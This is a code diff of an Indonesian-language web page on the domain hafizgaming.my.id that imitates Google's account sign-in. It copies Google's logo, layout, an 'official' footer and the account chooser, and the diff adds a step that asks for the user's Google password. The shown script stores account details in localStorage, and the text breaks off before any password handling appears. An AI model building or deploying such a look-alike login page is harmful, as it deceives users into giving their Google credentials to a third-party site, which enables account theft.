@@ -2,10 +2,10 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pilih Akun - Google</title>
-    <link rel="icon" href="//www.gstatic.com/images/branding/searchlogo/ico/favicon.ico">
-    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login - Akun Google</title>
+    <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         * {
             box-sizing: border-box;
@@ -15,554 +15,901 @@
         }
 
         body {
-            background-color: #0e0e0e;
+            background-color: #1e1f20;
             color: #e3e3e3;
-            font-family: 'Roboto', 'Google Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow-x: hidden;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
         }
 
-        .container {
-            max-width: 480px;
+        .page-wrapper {
             width: 100%;
-            margin: 0 auto;
-            padding: 36px 20px 40px;
-            flex: 1;
+            max-width: 920px;
             display: flex;
             flex-direction: column;
         }
 
-        /* Google Logo */
-        .google-header {
+        /* Main Google Card */
+        .g-card {
+            background-color: #0e0e0e;
+            border-radius: 28px;
+            padding: 36px 36px 36px;
+            min-height: 380px;
             display: flex;
-            align-items: center;
-            gap: 12px;
+            flex-direction: row;
+            gap: 48px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Indeterminate Google Top Progress Bar */
+        .progress-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background-color: #1e1f20;
+            overflow: hidden;
+            display: none;
+            z-index: 10;
+        }
+        .progress-bar.active {
+            display: block;
+        }
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -40%;
+            width: 40%;
+            height: 100%;
+            background-color: #a8c7fa;
+            animation: gProgress 1s infinite ease-in-out;
+        }
+        @keyframes gProgress {
+            0% { left: -40%; width: 40%; }
+            50% { left: 30%; width: 50%; }
+            100% { left: 100%; width: 40%; }
+        }
+
+        .g-col-left {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .g-col-right {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .g-logo {
+            width: 48px;
+            height: 48px;
             margin-bottom: 24px;
         }
 
-        .google-logo-svg {
-            width: 28px;
-            height: 28px;
+        .g-title {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 36px;
+            font-weight: 400;
+            line-height: 44px;
+            color: #e3e3e3;
+            margin-bottom: 16px;
+        }
+
+        .g-subtitle {
+            font-size: 16px;
+            line-height: 24px;
+            color: #e3e3e3;
+            font-weight: 400;
+        }
+
+        .g-subtitle .domain-link {
+            color: #a8c7fa;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        /* User Identifier Chip (Step 2 Password) */
+        .user-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #8e918f;
+            border-radius: 100px;
+            padding: 4px 10px 4px 6px;
+            margin-top: 4px;
+            cursor: pointer;
+            transition: background-color 0.15s;
+            max-width: 100%;
+        }
+        .user-chip:hover {
+            background-color: rgba(232, 234, 237, 0.08);
+        }
+        .user-chip-avatar {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #e3e3e3;
+            flex-shrink: 0;
+        }
+        .user-chip-email {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            color: #e3e3e3;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .user-chip-arrow {
+            width: 18px;
+            height: 18px;
+            fill: #e3e3e3;
             flex-shrink: 0;
         }
 
-        .google-logo-text {
-            font-size: 20px;
-            font-weight: 500;
-            color: #e8eaed;
-            font-family: 'Google Sans', Roboto, sans-serif;
-            letter-spacing: -0.3px;
-        }
-
-        .header-title {
-            font-size: 24px;
-            color: #ffffff;
-            font-weight: 400;
+        /* Material 3 Outlined Input with Floating Label */
+        .m3-field {
+            position: relative;
             margin-bottom: 8px;
-            font-family: 'Google Sans', Roboto, sans-serif;
-            letter-spacing: -0.2px;
+            width: 100%;
         }
 
-        .header-subtitle {
-            font-size: 14px;
+        .m3-input {
+            width: 100%;
+            height: 56px;
+            background: transparent;
+            border: 1px solid #8e918f;
+            border-radius: 4px;
+            padding: 16px 15px;
+            color: #e3e3e3;
+            font-size: 16px;
+            font-family: 'Roboto', sans-serif;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .m3-input:focus {
+            border: 2px solid #a8c7fa;
+            padding: 15px 14px;
+        }
+
+        .m3-field.error .m3-input {
+            border-color: #f28b82;
+        }
+        .m3-field.error .m3-input:focus {
+            border: 2px solid #f28b82;
+        }
+
+        .m3-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #0e0e0e;
+            padding: 0 4px;
             color: #c4c7c5;
-            margin-bottom: 24px;
-            line-height: 20px;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .header-subtitle b {
-            color: #ffffff;
+        .m3-input:focus + .m3-label,
+        .m3-input:not(:placeholder-shown) + .m3-label {
+            top: 0;
+            transform: translateY(-50%);
+            font-size: 12px;
+            color: #c4c7c5;
+        }
+
+        .m3-input:focus + .m3-label {
+            color: #a8c7fa;
+        }
+
+        .m3-field.error .m3-label {
+            color: #f28b82;
+        }
+
+        .m3-error-msg {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            color: #f28b82;
+            font-size: 12px;
+            margin-top: 6px;
+            line-height: 16px;
+        }
+        .m3-field.error + .m3-error-msg {
+            display: flex;
+        }
+
+        .g-link {
+            color: #a8c7fa;
+            font-size: 14px;
             font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 4px;
+            cursor: pointer;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+        }
+        .g-link:hover {
+            text-decoration: underline;
         }
 
-        /* Account List */
+        .guest-info {
+            font-size: 14px;
+            line-height: 20px;
+            color: #c4c7c5;
+            margin-top: 36px;
+            margin-bottom: 36px;
+        }
+
+        /* Show Password Checkbox */
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-top: 12px;
+            margin-bottom: 36px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .checkbox-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #a8c7fa;
+            cursor: pointer;
+        }
+        .checkbox-row span {
+            font-size: 14px;
+            color: #e3e3e3;
+        }
+
+        /* Action Buttons */
+        .g-actions {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 24px;
+            margin-top: auto;
+        }
+
+        .btn-text {
+            background: transparent;
+            border: none;
+            color: #a8c7fa;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 12px;
+            border-radius: 100px;
+            cursor: pointer;
+            transition: background-color 0.15s;
+        }
+        .btn-text:hover {
+            background-color: rgba(168, 199, 250, 0.08);
+        }
+
+        .btn-filled {
+            background-color: #a8c7fa;
+            color: #062e6f;
+            border: none;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 100px;
+            cursor: pointer;
+            transition: background-color 0.15s, box-shadow 0.15s;
+        }
+        .btn-filled:hover {
+            background-color: #b8d2fc;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        /* Account Chooser List ("Pilih akun") */
         .account-list {
             list-style: none;
-            border-top: 1px solid #282a2c;
-            margin-bottom: 4px;
+            width: 100%;
+            border-top: 1px solid #303134;
         }
 
         .account-item {
             display: flex;
             align-items: center;
-            padding: 13px 4px;
-            border-bottom: 1px solid #282a2c;
+            padding: 14px 4px;
+            border-bottom: 1px solid #303134;
             cursor: pointer;
-            transition: background-color 0.15s ease;
-            position: relative;
+            transition: background-color 0.15s;
         }
-
-        .account-item:active, .account-item:hover {
+        .account-item:hover, .account-item:active {
             background-color: rgba(255, 255, 255, 0.05);
         }
 
-        .avatar {
-            width: 38px;
-            height: 38px;
+        .account-avatar {
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
             font-size: 16px;
             font-weight: 500;
             color: #ffffff;
-            margin-right: 16px;
+            margin-right: 14px;
             flex-shrink: 0;
             text-transform: uppercase;
-            font-family: 'Google Sans', Roboto, sans-serif;
         }
 
-        .account-info {
+        .account-details {
             flex: 1;
             min-width: 0;
         }
 
         .account-name {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
             font-size: 15px;
             font-weight: 500;
             color: #e3e3e3;
+            line-height: 20px;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
-            line-height: 20px;
         }
 
         .account-email {
             font-size: 13px;
-            color: #8e918f;
+            color: #c4c7c5;
+            line-height: 18px;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
-            line-height: 18px;
         }
 
-        .btn-remove-acc {
+        .account-remove-btn {
             background: transparent;
             border: none;
             color: #8e918f;
-            font-size: 20px;
-            cursor: pointer;
-            padding: 4px 8px;
+            padding: 6px;
             border-radius: 50%;
-            display: flex;
+            cursor: pointer;
+            display: none;
             align-items: center;
             justify-content: center;
-            margin-left: 8px;
-            transition: color 0.15s, background-color 0.15s;
         }
-
-        .btn-remove-acc:hover {
+        .remove-mode .account-remove-btn {
+            display: flex;
+        }
+        .account-remove-btn:hover {
             color: #f28b82;
-            background-color: rgba(255, 255, 255, 0.1);
+            background-color: rgba(242, 139, 130, 0.1);
         }
 
-        .use-other-row {
+        .action-row {
             display: flex;
             align-items: center;
             padding: 15px 4px;
-            border-bottom: 1px solid #282a2c;
+            border-bottom: 1px solid #303134;
             cursor: pointer;
-            transition: background-color 0.15s ease;
+            transition: background-color 0.15s;
         }
-
-        .use-other-row:active, .use-other-row:hover {
+        .action-row:hover, .action-row:active {
             background-color: rgba(255, 255, 255, 0.05);
         }
-
-        .icon-circle {
-            width: 38px;
-            height: 38px;
-            border-radius: 50%;
+        .action-icon {
+            width: 36px;
+            height: 36px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 16px;
+            margin-right: 14px;
             flex-shrink: 0;
         }
-
-        .icon-circle svg {
-            width: 24px;
-            height: 24px;
+        .action-icon svg {
+            width: 22px;
+            height: 22px;
             fill: #c4c7c5;
         }
-
-        .use-other-text {
-            font-size: 15px;
+        .action-label {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 14px;
             font-weight: 500;
             color: #e3e3e3;
         }
 
-        .terms-notice {
+        .chooser-terms {
             font-size: 12px;
-            color: #8e918f;
             line-height: 18px;
-            margin-top: 24px;
-        }
-
-        .terms-notice a {
-            color: #8ab4f8;
-            text-decoration: none;
-        }
-
-        /* Sign-in Form Card */
-        .login-card {
-            background: #1e1f20;
-            border: 1px solid #3c4043;
-            border-radius: 16px;
-            padding: 24px 20px;
-            margin-top: 4px;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-        }
-
-        .input-label {
-            display: block;
-            font-size: 13px;
             color: #c4c7c5;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-
-        .text-input {
-            width: 100%;
-            background: #131314;
-            border: 1px solid #5f6368;
-            border-radius: 8px;
-            padding: 13px 14px;
-            color: #ffffff;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-        }
-
-        .text-input:focus {
-            border-color: #8ab4f8;
-            box-shadow: 0 0 0 1px #8ab4f8;
-        }
-
-        .text-input::placeholder {
-            color: #6e7174;
-        }
-
-        .input-hint {
-            font-size: 12px;
-            color: #8e918f;
-            margin-top: 6px;
-            line-height: 16px;
-        }
-
-        .form-actions {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
             margin-top: 24px;
-            gap: 12px;
-        }
-
-        .btn-pill {
-            padding: 10px 22px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            border: none;
-            font-family: 'Google Sans', Roboto, sans-serif;
-            transition: background-color 0.15s, opacity 0.15s;
-        }
-
-        .btn-primary {
-            background: #8ab4f8;
-            color: #001d35;
-        }
-
-        .btn-primary:hover {
-            background: #93bcf8;
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: #8ab4f8;
-        }
-
-        .btn-secondary:hover {
-            background: rgba(138, 180, 248, 0.08);
         }
 
         /* Footer */
-        .footer {
-            margin-top: auto;
-            padding: 24px 20px;
+        .g-footer {
             display: flex;
-            justify-content: space-between;
             align-items: center;
+            justify-content: space-between;
+            padding: 16px 8px 0;
             font-size: 12px;
-            color: #8e918f;
-            border-top: 1px solid #202124;
-            max-width: 480px;
-            width: 100%;
-            margin-left: auto;
-            margin-right: auto;
+            color: #e3e3e3;
         }
 
-        .footer-lang {
-            display: flex;
+        .g-lang {
+            display: inline-flex;
             align-items: center;
-            gap: 4px;
+            gap: 8px;
+            padding: 8px 12px;
+            border-radius: 4px;
             cursor: pointer;
         }
+        .g-lang:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
 
-        .footer-links {
+        .g-footer-links {
             display: flex;
-            gap: 16px;
+            gap: 8px;
         }
-
-        .footer-links a {
-            color: #8e918f;
+        .g-footer-links a {
+            color: #e3e3e3;
             text-decoration: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+        }
+        .g-footer-links a:hover {
+            background-color: rgba(255, 255, 255, 0.05);
         }
 
-        .footer-links a:hover {
-            color: #c4c7c5;
+        /* Mobile Layout (Exact match to native Android Chrome Google Sign-In / Account Chooser) */
+        @media (max-width: 600px) {
+            body {
+                background-color: #0e0e0e;
+                justify-content: space-between;
+                padding: 0;
+            }
+            .page-wrapper {
+                min-height: 100vh;
+                justify-content: space-between;
+            }
+            .g-card {
+                border-radius: 0;
+                padding: 24px 24px 16px;
+                flex-direction: column;
+                gap: 24px;
+                flex: 1;
+            }
+            .g-col-left {
+                flex: 0 0 auto;
+            }
+            .g-col-right {
+                flex: 1;
+                justify-content: flex-start;
+            }
+            .g-logo {
+                width: 40px;
+                height: 40px;
+                margin-bottom: 16px;
+            }
+            .g-title {
+                font-size: 24px;
+                line-height: 32px;
+                margin-bottom: 8px;
+            }
+            .g-actions {
+                justify-content: space-between;
+                margin-top: 32px;
+            }
+            .g-footer {
+                padding: 16px 24px 20px;
+            }
+            .g-lang {
+                padding-left: 0;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Google Header -->
-        <div class="google-header">
-            <svg class="google-logo-svg" viewBox="0 0 24 24">
-                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.8-2.4 3.65v3h3.88c2.27-2.09 3.665-5.17 3.665-9.09z"/>
-                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.24v3.09C3.26 21.37 7.33 24 12 24z"/>
-                <path fill="#FBBC05" d="M5.28 14.32c-.25-.72-.38-1.49-.38-2.32s.14-1.6.38-2.32V6.59H1.24C.45 8.16 0 9.97 0 12c0 2.03.45 3.84 1.24 5.41l4.04-3.09z"/>
-                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.33 0 3.26 2.63 1.24 6.59l4.04 3.09c.95-2.83 3.6-4.93 6.72-4.93z"/>
-            </svg>
-            <span class="google-logo-text">Google</span>
-        </div>
+    <div class="page-wrapper">
+        <div class="g-card" id="g-card">
+            <div class="progress-bar" id="progress-bar"></div>
 
-        <h1 class="header-title" id="header-title">Pilih akun</h1>
-        <div class="header-subtitle" id="header-subtitle">
-            untuk melanjutkan ke <b id="site-domain">hafizgaming.my.id</b>
-        </div>
+            <!-- Left Column: Logo, Title, Subtitle / User Chip -->
+            <div class="g-col-left">
+                <svg class="g-logo" id="g-logo" viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
 
-        <!-- Section 1: Daftar Akun Perangkat -->
-        <div id="section-account-list">
-            <ul class="account-list" id="account-list">
-                <!-- Diisi dinamis hanya dengan akun yang ada di perangkat ini -->
-            </ul>
-
-            <div class="use-other-row" id="btn-use-other">
-                <div class="icon-circle">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                    </svg>
+                <h1 class="g-title" id="view-title">Login</h1>
+                <div class="g-subtitle" id="view-subtitle">
+                    Lanjutkan ke <span class="domain-link" id="domain-label">hafizgaming.my.id</span>
                 </div>
-                <div class="use-other-text">Gunakan akun lain</div>
+
+                <!-- Shown only on Step 2 (Password) -->
+                <div class="user-chip" id="user-chip" style="display: none;">
+                    <div class="user-chip-avatar">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="#c4c7c5">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 1.22-6 3.22z"/>
+                        </svg>
+                    </div>
+                    <span class="user-chip-email" id="chip-email-text"></span>
+                    <svg class="user-chip-arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+                </div>
             </div>
 
-            <div class="terms-notice">
-                Untuk melanjutkan, Google akan membagikan nama, alamat email, dan preferensi bahasa Anda dengan <span id="site-domain-notice">hafizgaming.my.id</span>.
-            </div>
-        </div>
+            <!-- Right Column: Dynamic Views -->
+            <div class="g-col-right">
 
-        <!-- Section 2: Form Masuk / Tambah Akun Perangkat -->
-        <div id="section-account-form" style="display: none;">
-            <div class="login-card">
-                <form id="form-add-account">
-                    <div class="input-group">
-                        <label class="input-label" for="input-email">Email Akun Google (Gmail)</label>
-                        <input type="email" class="text-input" id="input-email" name="email" placeholder="contoh@gmail.com" autocomplete="email username" required>
-                        <div class="input-hint">Gunakan akun Gmail yang tersimpan di perangkat ini.</div>
+                <!-- VIEW A: Account Chooser ("Pilih akun") -->
+                <div id="view-chooser" style="display: none;">
+                    <ul class="account-list" id="account-list"></ul>
+
+                    <div class="action-row" id="btn-use-another">
+                        <div class="action-icon">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                            </svg>
+                        </div>
+                        <div class="action-label">Gunakan akun lain</div>
                     </div>
 
-                    <div class="input-group">
-                        <label class="input-label" for="input-name">Nama Akun (Opsional)</label>
-                        <input type="text" class="text-input" id="input-name" name="name" placeholder="Nama tampilan akun" autocomplete="name">
+                    <div class="chooser-terms">
+                        Untuk melanjutkan, Google akan membagikan nama, alamat email, dan foto profil Anda dengan <span id="terms-domain">hafizgaming.my.id</span>.
+                    </div>
+                </div>
+
+                <!-- VIEW B: Step 1 - Email / Identifier -->
+                <form id="view-email" style="display: none;" novalidate>
+                    <div class="m3-field" id="email-field-wrap">
+                        <input type="email" class="m3-input" id="input-email" placeholder=" " autocomplete="username email" autofocus>
+                        <label class="m3-label" for="input-email">Email atau nomor telepon</label>
+                    </div>
+                    <div class="m3-error-msg" id="email-error">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#f28b82"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span id="email-error-text">Masukkan email atau nomor telepon</span>
                     </div>
 
-                    <div class="form-actions">
-                        <button type="button" class="btn-pill btn-secondary" id="btn-form-cancel">Kembali</button>
-                        <button type="submit" class="btn-pill btn-primary">Lanjutkan</button>
+                    <div>
+                        <a class="g-link" id="link-forgot-email">Lupa email?</a>
+                    </div>
+
+                    <div class="guest-info">
+                        Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a class="g-link" style="margin-top:0;" href="https://support.google.com/chrome/answer/6130773?hl=id" target="_blank" rel="noopener">Pelajari lebih lanjut cara menggunakan mode Tamu</a>
+                    </div>
+
+                    <div class="g-actions">
+                        <button type="button" class="btn-text" id="btn-create-account">Buat akun</button>
+                        <button type="submit" class="btn-filled">Selanjutnya</button>
                     </div>
                 </form>
+
+                <!-- VIEW C: Step 2 - Password -->
+                <form id="view-password" style="display: none;" novalidate>
+                    <div class="m3-field" id="password-field-wrap">
+                        <input type="password" class="m3-input" id="input-password" placeholder=" " autocomplete="current-password">
+                        <label class="m3-label" for="input-password">Masukkan sandi Anda</label>
+                    </div>
+                    <div class="m3-error-msg" id="password-error">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#f28b82"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span>Masukkan sandi</span>
+                    </div>
+
+                    <label class="checkbox-row" for="chk-show-pass">
+                        <input type="checkbox" id="chk-show-pass">
+                        <span>Tampilkan sandi</span>
+                    </label>
+
+                    <div class="g-actions">
+                        <button type="button" class="btn-text" id="btn-forgot-pass">Lupa sandi?</button>
+                        <button type="submit" class="btn-filled">Selanjutnya</button>
+                    </div>
+                </form>
+
+                <!-- VIEW D: Create Account / Custom Name Step -->
+                <form id="view-name" style="display: none;" novalidate>
+                    <div class="m3-field" id="name-field-wrap" style="margin-bottom: 16px;">
+                        <input type="text" class="m3-input" id="input-first-name" placeholder=" " autocomplete="given-name">
+                        <label class="m3-label" for="input-first-name">Nama depan</label>
+                    </div>
+                    <div class="m3-error-msg" id="name-error" style="margin-bottom: 12px;">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#f28b82"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span>Masukkan nama depan</span>
+                    </div>
+
+                    <div class="m3-field" style="margin-bottom: 28px;">
+                        <input type="text" class="m3-input" id="input-last-name" placeholder=" " autocomplete="family-name">
+                        <label class="m3-label" for="input-last-name">Nama belakang (opsional)</label>
+                    </div>
+
+                    <div class="g-actions">
+                        <button type="button" class="btn-text" id="btn-back-from-name">Kembali</button>
+                        <button type="submit" class="btn-filled">Selanjutnya</button>
+                    </div>
+                </form>
+
             </div>
         </div>
-    </div>
 
-    <!-- Footer Standar Google -->
-    <div class="footer">
-        <div class="footer-lang">
-            <span>Indonesia</span>
-            <svg style="width:12px;height:12px;fill:#8e918f" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
-        </div>
-        <div class="footer-links">
-            <a href="#">Bantuan</a>
-            <a href="#">Privasi</a>
-            <a href="#">Persyaratan</a>
+        <!-- Official Google Footer -->
+        <div class="g-footer">
+            <div class="g-lang">
+                <span>Indonesia</span>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#e3e3e3"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="g-footer-links">
+                <a href="https://support.google.com/accounts?hl=id" target="_blank" rel="noopener">Bantuan</a>
+                <a href="https://policies.google.com/privacy?hl=id" target="_blank" rel="noopener">Privasi</a>
+                <a href="https://policies.google.com/terms?hl=id" target="_blank" rel="noopener">Persyaratan</a>
+            </div>
         </div>
     </div>
 
     <script>
-        // Set nama domain dinamis
-        const currentHost = window.location.hostname || 'hafizgaming.my.id';
-        const displayHost = currentHost.replace(/^www\./, '');
-        document.getElementById('site-domain').textContent = displayHost;
-        document.getElementById('site-domain-notice').textContent = displayHost;
+        (function() {
+            var host = (window.location.hostname || 'hafizgaming.my.id').replace(/^www\./, '');
+            document.getElementById('domain-label').textContent = host;
+            document.getElementById('terms-domain').textContent = host;
 
-        let isExplicitAddMode = false;
+            var params = new URLSearchParams(window.location.search);
+            var forceAdd = params.get('add') === '1';
 
-        // Ambil akun yang HANYA tersimpan di perangkat pengguna saat ini (tanpa template orang lain)
-        function getDeviceAccounts() {
-            try {
-                const stored = localStorage.getItem('google_device_accounts');
-                if (stored) {
-                    const parsed = JSON.parse(stored);
-                    if (Array.isArray(parsed)) return parsed;
+            var pendingEmail = '';
+            var pendingCustomName = '';
+
+            var progressBar = document.getElementById('progress-bar');
+            var viewTitle = document.getElementById('view-title');
+            var viewSubtitle = document.getElementById('view-subtitle');
+            var userChip = document.getElementById('user-chip');
+            var chipEmailText = document.getElementById('chip-email-text');
+
+            var viewChooser = document.getElementById('view-chooser');
+            var viewEmail = document.getElementById('view-email');
+            var viewPassword = document.getElementById('view-password');
+            var viewName = document.getElementById('view-name');
+
+            function getDeviceAccounts() {
+                try {
+                    var raw = localStorage.getItem('google_device_accounts');
+                    if (raw) {
+                        var parsed = JSON.parse(raw);
+                        if (Array.isArray(parsed)) return parsed;
+                    }
+                } catch (e) {}
+                return [];
+            }
+
+            function saveDeviceAccounts(list) {
+                localStorage.setItem('google_device_accounts', JSON.stringify(list));
+            }
+
+            function escapeHtml(str) {
+                var d = document.createElement('div');
+                d.textContent = str || '';
+                return d.innerHTML;
+            }
+
+            function formatNameFromEmail(email) {
+                var local = email.split('@')[0] || 'Pengguna';
+                return local
+                    .replace(/[._-]+/g, ' ')
+                    .replace(/\b\w/g, function(c) { return c.toUpperCase(); });
+            }
+
+            function withLoading(callback) {
+                progressBar.classList.add('active');
+                setTimeout(function() {
+                    progressBar.classList.remove('active');
+                    callback();
+                }, 320);
+            }
+
+            function completeLogin(account) {
+                progressBar.classList.add('active');
+                localStorage.setItem('isLoggedIn', 'true');
+                localStorage.setItem('userName', account.name);
+                localStorage.setItem('userEmail', account.email);
+                localStorage.setItem('userInitial', account.initial || account.name.charAt(0).toUpperCase());
+                localStorage.setItem('userColor', account.color || '#4285f4');
+
+                setTimeout(function() {
+                    window.location.href = '/';
+                }, 280);
+            }
+
+            function hideAllViews() {
+                viewChooser.style.display = 'none';
+                viewEmail.style.display = 'none';
+                viewPassword.style.display = 'none';
+                viewName.style.display = 'none';
+                userChip.style.display = 'none';
+                viewSubtitle.style.display = 'block';
+            }
+
+            function showChooserView() {
+                var accounts = getDeviceAccounts();
+                if (accounts.length === 0) {
+                    showEmailView();
+                    return;
                 }
-            } catch(e) {}
-            return []; // Bersih: Tidak ada akun bawaan/template yang di-hardcode
-        }
+                hideAllViews();
+                viewTitle.textContent = 'Pilih akun';
+                viewSubtitle.innerHTML = 'Lanjutkan ke <span class="domain-link">' + escapeHtml(host) + '</span>';
+                viewChooser.style.display = 'block';
 
-        function saveDeviceAccounts(accounts) {
-            localStorage.setItem('google_device_accounts', JSON.stringify(accounts));
-        }
+                var listEl = document.getElementById('account-list');
+                listEl.innerHTML = '';
 
-        function selectAccount(account) {
-            localStorage.setItem('isLoggedIn', 'true');
-            localStorage.setItem('userName', account.name);
-            localStorage.setItem('userEmail', account.email);
-            localStorage.setItem('userInitial', account.initial || account.name.charAt(0).toUpperCase());
-            localStorage.setItem('userColor', account.color || '#4285f4');
-
-            // Kembali ke halaman utama
-            window.location.href = '/';
-        }
-
-        function removeAccount(idx, e) {
-            e.stopPropagation();
-            const accounts = getDeviceAccounts();
-            accounts.splice(idx, 1);
-            saveDeviceAccounts(accounts);
